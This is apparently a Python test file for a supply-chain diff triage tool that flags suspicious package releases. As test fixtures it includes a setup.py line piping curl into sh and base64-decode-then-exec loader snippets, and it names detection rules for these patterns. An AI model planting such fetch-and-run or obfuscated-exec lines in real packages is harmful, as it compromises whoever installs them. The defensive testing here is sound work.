from pathlib import Path
from pydiffwatch.rules import load_rules
from pydiffwatch.engine import triage
from pydiffwatch.config import Config
from pydiffwatch.models import Diff, FileDiff, Hunk

RULES = load_rules(Path("rules/community"))


def _code(path, added):
    return Diff("p", "1.1", False, [FileDiff(path, "modified",
        [Hunk((0, 0), (0, len(added)), added, [])], "\n".join(added))], [])


def test_all_shipped_rules_valid_and_no_crownjewel():
    ids = {r.id for r in RULES}
    expected = {"syntax-error-suspicious", "primitives", "autoexec-location", "combo-fetch-exec",
                "combo-decode-exec", "combo-cred-network", "binary-source-too-large",
                "foreign-language-source", "binary-new-binary", "dep-typosquat", "dep-nonexistent",
                "dep-brand-new", "maintainer-set-change"}
    assert expected <= ids, f"missing: {expected - ids}"
    assert "obfuscated-loader" not in ids   # crown jewel (decode->exec taint) is NOT shipped


def test_no_rule_was_dropped_as_invalid():
    # every shipped YAML rule must pass validation (load_rules silently drops invalid ones)
    assert len(RULES) == 13


def test_install_hook_escalates():
    assert triage(_code("setup.py", ["import os", "os.system('curl x|sh')"]), Config(), RULES).escalate


def test_benign_refactor_does_not_escalate():
    r = triage(_code("m/x.py", ["import re, json", "re.compile(P)", "json.loads(B)"]), Config(), RULES)
    assert not r.escalate


def test_decode_exec_combo_escalates():
    r = triage(_code("m/__init__.py", ["import base64", "exec(base64.b64decode(B))"]), Config(), RULES)
    assert r.escalate and any(fr.rule == "combo-decode-exec" for fr in r.fired_rules)


def test_method_body_exec_not_autoexec_location():
    # aiops-ml shape: exec inside a method (only runs when called) must NOT fire autoexec-location even
    # in __init__.py. combo-decode-exec still fires (the co-occurrence is still worth review), so it
    # still escalates — only the false install-hook framing is dropped.
    full = ("import base64\n"
            "class Algo:\n"
            "    def on_transfer(self, p_code):\n"
            "        s = base64.b64decode(p_code)\n"
            "        exec(s)\n")
    d = Diff("p", "1.1", False, [FileDiff("pkg/__init__.py", "modified",
        [Hunk((0, 0), (0, len(full.splitlines())), full.splitlines(), [])], full)], [])
    r = triage(d, Config(), RULES)
    assert not any(fr.rule == "autoexec-location" for fr in r.fired_rules)
    assert any(fr.rule == "combo-decode-exec" for fr in r.fired_rules)


def test_dep_typosquat_escalates():
    d = Diff("p", "1.1", False, [], [], added_dep_findings=[{"name": "reqursts", "reason": "typosquat"}])
    assert triage(d, Config(), RULES).escalate


def test_two_foreign_files_escalate():
    d = Diff("p", "1.1", False, [], [{"path": "a.php", "reason": "foreign-language-source"},
                                     {"path": "b.php", "reason": "foreign-language-source"}])
    assert triage(d, Config(), RULES).escalate


def test_tests_dir_does_not_escalate():
    # same dangerous call under tests/ stays low (location 0.2) — autoexec needs location>=3
    assert not triage(_code("tests/t.py", ["import os", "os.system('x')"]), Config(), RULES).escalate


def test_post_parse_crash_fires_syntax_error_rule_scaled_by_location():
    # A 5,000-term wide expression parses fine but used to RecursionError in the post-parse walk,
    # skipping straight to a silent gave_up. It must instead surface as syntax_error=True, which
    # scales syntax-error-suspicious (weight 20) by location_weight: 3.0 for __init__.py, 1.0 elsewhere.
    src = "x = " + "+".join(["1"] * 5000)
    full = src.splitlines()

    def _wholefile(path, added):
        return Diff("p", "1.1", False, [FileDiff(path, "modified",
            [Hunk((0, 0), (0, len(added)), added, [])], "\n".join(added))], [])

    r_init = triage(_wholefile("m/__init__.py", full), Config(), RULES)
    fr_init = next(fr for fr in r_init.fired_rules if fr.rule == "syntax-error-suspicious")
    assert fr_init.weight == 20 * 3.0

    r_other = triage(_wholefile("pkg/util.py", full), Config(), RULES)
    fr_other = next(fr for fr in r_other.fired_rules if fr.rule == "syntax-error-suspicious")
    assert fr_other.weight == 20 * 1.0


def test_deep_pad_does_not_mask_a_real_decode_exec_loader():
    # CRITICAL fix: previously the depth guard short-circuited extraction entirely, so padding a real
    # decode->exec loader with a deep expression dropped combo-decode-exec and the release stopped
    # escalating -- an evasion. The extraction must always run; the depth flag is additive only.
    pad = "+".join(["1"] * 5000)   # depth well past _MAX_AST_DEPTH -- syntax_error will also be set
    added = ["import base64", f"_pad = {pad}", "exec(base64.b64decode(d))"]
    d = Diff("p", "1.1", False, [FileDiff("pkg/util.py", "modified",
        [Hunk((0, 0), (0, len(added)), added, [])], "\n".join(added))], [])
    r = triage(d, Config(), RULES)
    assert any(fr.rule == "combo-decode-exec" for fr in r.fired_rules)
    assert r.escalate
